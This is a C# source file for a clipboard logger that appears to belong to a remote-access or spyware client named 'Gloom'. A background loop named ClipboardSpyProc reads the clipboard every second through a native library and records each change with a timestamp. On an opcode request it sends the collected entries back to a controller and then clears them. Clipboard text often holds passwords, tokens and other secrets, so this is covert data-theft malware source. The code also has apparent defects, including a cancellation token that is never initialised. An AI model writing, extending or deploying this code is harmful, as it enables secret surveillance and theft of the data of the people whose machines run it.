using Gloom.Client.Features.Logger.InputLog;
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Gloom.Client.Features.Logger
{
	public class ClipboardLogger : FeatureBase
	{
		protected readonly CancellationTokenSource cancel;

		[DllImport("Gloom.GloomLib.dll")]
		private static extern ulong ClipIndex();

		[DllImport("Gloom.GloomLib.dll")]
		private static extern int ClipTextSize();

		[DllImport("Gloom.GloomLib.dll")]
		private static extern void ClipTextCopy(int bufferSize, IntPtr buffer);

		private static string GetClipText()
		{
			var bufferSize = ClipTextSize();
			if (bufferSize < 0)
				return "Error code " + bufferSize;
			bufferSize = Math.Min(bufferSize, 4096); // Max 4 KiB
			var mem = Marshal.AllocHGlobal(bufferSize);
			ClipTextCopy(bufferSize, mem);
			var strBytes = new byte[bufferSize];
			Marshal.Copy(mem, strBytes, 0, bufferSize);
			var str = new string(Encoding.UTF8.GetString(strBytes));
			Marshal.FreeHGlobal(mem);
			return str;
		}

		private ulong PreviousIndex = 0;
		private List<OpStructs.ClipboardEntry> ClipEntries = new();

		public ClipboardLogger(IMessageSender sender) : base(sender)
		{
			Task.Run(async () => await ClipboardSpyProc(cancel.Token));
		}

		public override Guid[] AcceptedOps => new Guid[] { OpCodes.ClipboardLogRequest, OpCodes.ClipboardLoggerSettingRequest };

		private async Task ClipboardSpyProc(CancellationToken ct)
		{
			while (!ct.IsCancellationRequested)
			{
				var index = ClipIndex();
				if (PreviousIndex != index)
				{
					var text = GetClipText();
#if DEBUG
					Console.WriteLine("Clipboard update: " + text);
#endif
					ClipEntries.Add(new OpStructs.ClipboardEntry { TimeStamp = DateTime.Now, Text = text });
				}
				PreviousIndex = index;
				await Task.Delay(1000, ct);
			}
		}

		public override async Task HandleAsync(Guid op, byte[] data)
		{
			if (op == OpCodes.ClipboardLogRequest)
			{
				await SendAsync(OpCodes.ClipboardLogResponse, new OpStructs.ClipboardLogResponse { Entries = ClipEntries });
				ClipEntries.Clear();
			}
			else if (op == OpCodes.ClipboardLoggerSettingRequest)
			{

			}
		}
	}
}
